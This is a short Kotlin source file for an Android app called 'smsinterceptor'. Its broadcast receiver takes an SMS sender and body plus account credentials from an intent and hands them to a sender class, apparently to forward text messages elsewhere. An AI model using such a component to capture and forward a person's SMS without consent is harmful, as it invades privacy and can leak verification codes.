package ru.smsinterceptor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class AlarmReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent != null) {
            val from = intent.getStringExtra("from")
            val to = intent.getStringExtra("to")
            val password = intent.getStringExtra("pass")
            val sms_from = intent.getStringExtra("sms_from")
            val body = intent.getStringExtra("body")
            if (from != null && to != null && password != null) {
                AsyncSender().execute(from, to, password, sms_from, body)
            }
        }
    }
}